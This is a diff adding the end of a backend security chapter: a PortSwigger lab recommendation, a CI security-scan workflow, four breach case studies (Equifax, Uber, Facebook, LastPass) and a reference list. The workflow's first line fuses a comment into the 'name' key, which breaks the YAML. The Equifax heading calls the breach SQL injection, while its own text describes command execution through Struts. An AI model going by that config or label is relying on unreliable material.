+- **Scanner** (Pro only), automated vulnerability scanning.
+
+### PortSwigger Web Security Academy: Free Lab-Based Learning
+
+The best free resource for hands-on security practice. Every vulnerability has:
+
+- A clear explanation of the theory
+- An interactive lab (real vulnerable web app, in-browser)
+- A walkthrough if you get stuck
+
+Start with: SQL Injection -> XSS -> IDOR (BOLA) -> Authentication vulnerabilities -> Access Control. Each module takes 1-3 hours and teaches you more than reading theory alone ever could.
+
+<Callout type="info">
+The mindset shift that matters most: stop thinking "will users do this?" and start thinking "what's the _worst_ possible input I could receive here, and what happens if I do?" Write that as a test case. Run it in CI.
+</Callout>
+
+### Automated Security Testing in CI/CD
+
+```bash
+GitHub Actions / Security scan on every PRname: Security Scan
+on: [pull_request]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with: { fetch-depth: 0 }  # full history for secret scanning
+
+      # Scan for hardcoded secrets in entire git history
+      - name: Gitleaks
+        uses: gitleaks/gitleaks-action@v2
+
+      # Static analysis for Go security issues
+      - name: Gosec
+        uses: securego/gosec@master
+        with:
+          args: ./...
+
+      # Dependency vulnerability check
+      - name: Nancy (Go deps)
+        run: |
+          go list -json -m all | nancy sleuth
+```
+
+19
+
+## Real Incident Case Studies
+
+Theory lands harder when you see what it cost real companies. These are four of the most instructive security breaches, each one directly caused by a vulnerability covered in this chapter.
+
+### (1) Equifax (2017): SQL Injection / Unpatched Dependency
+
+<Callout type="info">
+147 million people's SSNs, birth dates, addresses, and credit card numbers stolen. Equifax paid \~$700 million in settlements.
+</Callout>
+
+**What happened:** Attackers exploited a known vulnerability (CVE-2017-5638) in Apache Struts, a Java web framework Equifax used. The vulnerability allowed attackers to execute arbitrary OS commands via a specially crafted HTTP header. A patch had been available for _two months_ before the breach. Equifax had not applied it.
+
+**What was missed:**
+
+- No automated dependency vulnerability scanning in CI/CD.
+- No process for urgently patching critical CVEs.
+- Internal network not segmented, attackers moved laterally and accessed 48 additional databases once inside.
+- SSL inspection was disabled due to an expired internal certificate, malicious traffic went undetected for 76 days.
+
+**Lesson:** Keep dependencies updated. Run automated CVE scans (`dependabot`, `snyk`, `nancy`) on every build. Apply critical security patches within 24-72 hours.
+
+### (2) Uber (2022): Secrets in Code + Social Engineering
+
+<Callout type="info">
+Attacker gained access to Uber's internal systems, Slack workspace, AWS, GCP, HackerOne bug reports, and source code. No data was sold, but the access was total.
+</Callout>
+
+**What happened:** An 18-year-old attacker used MFA fatigue (bombarding an Uber contractor with push notifications until they accepted one) to gain initial access. They then found a PowerShell script on an internal network share that contained **hardcoded admin credentials** for Uber's Privileged Access Management (PAM) tool. With those credentials, they had access to virtually everything.
+
+**What was missed:**
+
+- Hardcoded secrets in a script on an internal share, not in a secrets manager.
+- No MFA-resistant authentication (hardware keys / passkeys) for privileged access.
+- MFA push fatigue not mitigated (no number-matching, no rate limit on push attempts).
+- Over-privileged contractor access, too much lateral movement possible from one compromised account.
+
+**Lesson:** Secrets belong in a secrets manager (AWS Secrets Manager, HashiCorp Vault, Doppler), never in scripts, config files, or chat messages. Use phishing-resistant MFA (hardware keys) for admin access. Apply least-privilege everywhere.
+
+### (3) Facebook (2018): Broken Authorization (Access Token Theft)
+
+<Callout type="info">
+50 million user access tokens stolen due to a bug in the "View As" feature. Attackers could log in as any of those 50 million users.
+</Callout>
+
+**What happened:** The "View As" feature let users see their profile as another user would see it. A bug in this feature caused it to incorrectly generate a video uploader component with a live access token, belonging to the user being viewed, not the viewer. Three compounding bugs created this flaw:
+
+1. Video uploader was incorrectly shown in "View As" mode.
+2. The uploader generated an access token for the wrong user (the viewed user, not the viewer).
+3. The access token had full account permissions instead of limited scope.
+
+**Lesson:** Authorization is hard to test manually at scale. The BOLA principle applies: verify ownership at every data access point. Use short-lived, minimally-scoped tokens. Build automated tests specifically for authorization boundaries.
+
+### (4) LastPass (2022): Developer Machine Compromise -> Production Data
+
+<Callout type="info">
+Attackers stole encrypted password vaults of all LastPass customers. Ongoing brute-force attacks on weak master passwords may continue to decrypt vaults for years.
+</Callout>
+
+**What happened:** Attackers first compromised a DevOps engineer's home computer by exploiting a vulnerable media software package (Plex). That machine had access to the LastPass cloud backup environment. Through that single developer machine, attackers exfiltrated:
+
+- Encrypted customer password vaults (the crown jewels)
+- Customer metadata (email, billing address, IP addresses)
+- Cloud infrastructure configuration and secrets
+
+**What was missed:**
+
+- Developer machines should not have direct access to production backup environments, use bastion hosts and just-in-time access.
+- Personal machines used for work should be enrolled in MDM (Mobile Device Management) with security policies enforced.
+- Vault encryption used PBKDF2 with low iteration counts, weaker master passwords are crackable offline.
+- No anomaly detection on the unusual volume of data being exfiltrated.
+
+**Lesson:** The supply chain is part of your attack surface. A developer's home laptop is part of your security perimeter. Segment production access. Monitor for anomalous data exfiltration. Use hardware security keys for production access.
+
+### Common Thread Across All Four
+
+<Diagram caption="Fig C: Every breach traces to an assumption that turned out to be wrong. Security is assumption management.">
+<svg viewBox="0 0 680 120" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="120" fill="var(--dg-paper)"></rect><rect x="20" y="20" width="140" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="90" y="52" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Equifax</text><text x="90" y="68" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Assumption: "we'll</text><text x="90" y="82" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">patch it later"</text><rect x="178" y="20" width="140" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="248" y="52" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Uber</text><text x="248" y="68" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Assumption: "this</text><text x="248" y="82" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">script is internal"</text><rect x="336" y="20" width="140" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="406" y="52" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Facebook</text><text x="406" y="68" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Assumption: "auth</text><text x="406" y="82" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">checked at routing"</text><rect x="494" y="20" width="165" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="576" y="52" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">LastPass</text><text x="576" y="68" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Assumption: "dev laptop</text><text x="576" y="82" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">is outside perimeter"</text></svg>
+</Diagram>
+
+20
+
+## References & Further Reading
+
+[PortSwigger Web Security Academy](https://portswigger.net/web-security) [OWASP Top 10](https://owasp.org/www-project-top-ten/) [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) [Lucia Auth (secure auth patterns)](https://lucia-auth.com/) [jwt.io (JWT debugger)](https://jwt.io/) [Gitleaks (secret scanner)](https://github.com/gitleaks/gitleaks) [Go argon2 package](https://pkg.go.dev/golang.org/x/crypto/argon2) [Python argon2-cffi](https://pypi.org/project/argon2-cffi/) [MDN, Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) [MDN, HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) [OAuth 2.0 Spec](https://oauth.net/2/) [OIDC Overview](https://openid.net/developers/how-connect-works/) [Go OIDC Library](https://pkg.go.dev/github.com/coreos/go-oidc/v3/oidc) [SSL Labs TLS Tester](https://www.ssllabs.com/ssltest/) [Caddy Automatic HTTPS](https://caddyserver.com/docs/automatic-https) [Burp Suite Community](https://portswigger.net/burp/communitydownload) [gosec (Go static analysis)](https://github.com/securego/gosec) [CVE-2017-5638 (Equifax)](https://www.cvedetails.com/cve/CVE-2017-5638/) [Uber 2022 Breach Report](https://www.uber.com/newsroom/security-update/) [LastPass Breach Notice](https://blog.lastpass.com/2022/12/notice-of-recent-security-incident/)
+
+---
+
+Backend Field Manual / Backend Security / Chapter 17 (Extended)
+
+Backend from First Principles / Chapter 17 / Security. Code targets Go 1.22+ and Python 3.11+.
